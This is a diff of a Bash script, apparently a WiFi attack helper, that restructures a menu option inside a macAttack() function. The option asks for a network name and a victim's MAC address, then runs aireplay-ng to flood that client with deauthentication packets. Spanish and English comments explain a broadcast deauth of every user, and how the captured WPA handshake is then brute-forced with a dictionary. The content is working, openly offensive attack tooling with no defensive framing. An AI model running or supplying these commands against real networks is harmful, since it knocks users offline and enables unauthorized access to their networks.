@@ -410,46 +410,40 @@ macAttack(){
     # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
   fi
 
-}
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -n -e "$yellowColour Enter the name of the Wifi (ESSID): $endColour"
+    read wifiName
+    echo " "
+    echo -n -e "$yellowColour Enter the MAC address of the user you want to deauthenticate (STATION): $endColour"
+    read macClient
+    echo " "
+    echo -e "$greenColour We proceed to send deauthentication packets to the specified MAC address$endColour"
+    echo " "
+    echo -e "$greenColour It is advisable to wait 1 minute$endColour"
+    echo " "
+    echo -e "$greenColour When the minute has passed, press Ctrl + C to stop the process and from a new terminal choose option 7$endColour"
+    echo " "
+    sleep 13
 
-# Escoge esta opción sólo si no hay clientes conectados a la red
+    # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
+    # a que se genere el Handshake. Si quisiéramos hacer un Broadcast para echar a todos los usuarios de la red y
+    # esperar a que se genere el Handshake por parte de uno de los usuarios, tendríamos que especificar como dirección
+    # MAC la siguiente -> FF:FF:FF:FF:FF:FF
 
-# Choose this option only if there are no clients connected to the network
+    # Then we proceed to de-authenticate a network user, then we wait until handhsake is generated. If we want to make a
+    # Broadcast for de-authenticate all users from the same network and wait for the Handshake, we need to specify as
+    # MAC address -> FF:FF:FF:FF:FF:FF
 
-if [ "$engOptions" = "1" ]; then
-  echo " "
-  echo -n -e "$yellowColour Enter the name of the Wifi (ESSID): $endColour"
-  read wifiName
-  echo " "
-  echo -n -e "$yellowColour Enter the MAC address of the user you want to deauthenticate (STATION): $endColour"
-  read macClient
-  echo " "
-  echo -e "$greenColour We proceed to send deauthentication packets to the specified MAC address$endColour"
-  echo " "
-  echo -e "$greenColour It is advisable to wait 1 minute$endColour"
-  echo " "
-  echo -e "$greenColour When the minute has passed, press Ctrl + C to stop the process and from a new terminal choose option 7$endColour"
-  echo " "
-  sleep 13
+    aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0
 
-  # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
-  # a que se genere el Handshake. Si quisiéramos hacer un Broadcast para echar a todos los usuarios de la red y
-  # esperar a que se genere el Handshake por parte de uno de los usuarios, tendríamos que especificar como dirección
-  # MAC la siguiente -> FF:FF:FF:FF:FF:FF
+    # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
+    # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
+    # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
 
-  # Then we proceed to de-authenticate a network user, then we wait until handhsake is generated. If we want to make a
-  # Broadcast for de-authenticate all users from the same network and wait for the Handshake, we need to specify as
-  # MAC address -> FF:FF:FF:FF:FF:FF
-
-  aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0
-
-  # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
-  # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
-  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
-
-  # We could have done a global deauthentication and wait until Handshake is generated, this is as follow:
-  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
-fi
+    # We could have done a global deauthentication and wait until Handshake is generated, this is as follow:
+    # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
+  fi
 
 }
 
